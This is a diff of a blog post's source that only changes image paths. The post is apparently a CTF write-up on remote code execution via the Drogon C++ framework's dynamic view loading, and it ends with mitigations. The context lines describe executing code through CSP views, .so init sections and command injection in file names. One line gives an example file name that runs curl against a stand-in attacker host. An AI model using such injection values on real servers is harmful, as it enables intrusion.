@@ -8,7 +8,7 @@ tags:
   - programming
   - notes
   - writeup
-thumbnail_src: assets/drogon/drogon-thumbnail.png
+thumbnail_src: assets/drogon-thumbnail.png
 thumbnail_banner: true
 tocOptions: '{"tags":["h2","h3","h4"]}'
 related:
@@ -23,7 +23,7 @@ At the same time, this is also a good exercise in defensive programming. If we r
 
 This turned out to be a fascinating endeavour, as we found a *ton* of ways to compromise a vulnerable DVL-enabled server. In the making of the CTF challenges, I struggled to eliminate every single unintended solution.
 
-{% image "assets/drogon/craft-a-ctf-web-chal.jpg", "w-60", "Every time I find an unintended solution, a new one is just around the corner." %}
+{% image "assets/craft-a-ctf-web-chal.jpg", "w-60", "Every time I find an unintended solution, a new one is just around the corner." %}
 
 <sup>Every time I find an unintended solution, a new one is just around the corner.</sup>{.caption}
 
@@ -101,7 +101,7 @@ After all, C++ is compiled, not interpreted.
 
 But it's possible to load compiled code at runtime through [shared objects](https://en.wikipedia.org/wiki/Shared_library). These are specially-compiled files which can be loaded on-the-fly. In Drogon, the process goes like so:
 
-{% image "assets/drogon/drogon-dynamic-view-loading.png", "w-50 alpha-imgv", "Flow Chart of Dynamic Views Loading" %}
+{% image "assets/drogon-dynamic-view-loading.png", "w-50 alpha-imgv", "Flow Chart of Dynamic Views Loading" %}
 
 <sup>Flow Chart of Dynamic Views Loading</sup>{.caption}
 
@@ -227,7 +227,7 @@ To trigger this RCE, the application code needs to render the view with `HttpRes
 
 The following diagram shows where code execution occurs along the pipeline. We'll update the diagram as we explore other vectors.
 
-{% image "assets/drogon/drogon-dynamic-view-loading-exec-on-render.png", "w-60 alpha-imgv", "Vanilla RCE with Drogon DVL: we can execute code with `<%c++`." %}
+{% image "assets/drogon-dynamic-view-loading-exec-on-render.png", "w-60 alpha-imgv", "Vanilla RCE with Drogon DVL: we can execute code with `<%c++`." %}
 
 <sup>A simple and direct method of abusing CSPs. Execution occurs when the view is rendered, e.g. by calling `newHttpViewResponse`.</sup>{.caption}
 
@@ -419,7 +419,7 @@ The previous tricks use `<%c++` which only executes when the view is rendered. B
 
 That's right, all we need is to load the .so to execute code!
 
-{% image "assets/drogon/drogon-dynamic-view-loading-exec-on-init.png", "w-60 alpha-imgv", "Code can be executed right after loading the .so binary." %}
+{% image "assets/drogon-dynamic-view-loading-exec-on-init.png", "w-60 alpha-imgv", "Code can be executed right after loading the .so binary." %}
 
 <sup>Using `<%c++` will execute code when "View is Rendered", but by strategically placing code in the `.init` section of the binary, we can get code to execute right after loading the .so!</sup>{.caption}
 
@@ -511,7 +511,7 @@ Remember how Drogon runs `drogon_ctl` to convert .csp files to .cc files? Guess 
 
 That’s right, `system()` is [called](https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/lib/src/SharedLibManager.cc#L169). And since the CSP file name can be pretty much anything — subject to Linux’s file path conditions — we can inject arbitrary commands and achieve RCE!
 
-{% image "assets/drogon/drogon-dynamic-view-loading-exec-on-filename.png", "w-70 alpha-imgv", "Malicious code can be executed when `drogon_ctl` is run using the filename." %}
+{% image "assets/drogon-dynamic-view-loading-exec-on-filename.png", "w-70 alpha-imgv", "Malicious code can be executed when `drogon_ctl` is run using the filename." %}
 
 Additionally, our command can contain slashes, since Drogon recursively scans subdirectories. A file named `foo$(curl attacker.site/abcd)` will be treated as a folder (`foo$(curl attacker.site/`) + a file (`abcd)`).
 
@@ -536,7 +536,7 @@ And mitigations?
     - It doesn't matter if the view will be rendered in application code, because — [as we discovered earlier](#4-rce-via-file-name) — once `drogon_ctl` is run, an RCE endpoint is already exposed.
 4. If, on the off chance, your environment accepts untrusted CSP files, you should consider using some filtering/denylist mechanism.
     - If filtering is performed, it should happen before files are written to the dynamic views directory. Once files are written, it's (likely) too late: Drogon kicks in and devours the CSP.
-    {% image "assets/drogon/drogon-dynamic-view-loading-defence.png", "w-70 alpha-imgv", "Defensive filtering, if any, should occur before CSP files are written." %}
+    {% image "assets/drogon-dynamic-view-loading-defence.png", "w-70 alpha-imgv", "Defensive filtering, if any, should occur before CSP files are written." %}
     <p class="caption">
     <sup>Defensive filtering, if any, should occur before CSP files are written.</sup>
     </p>
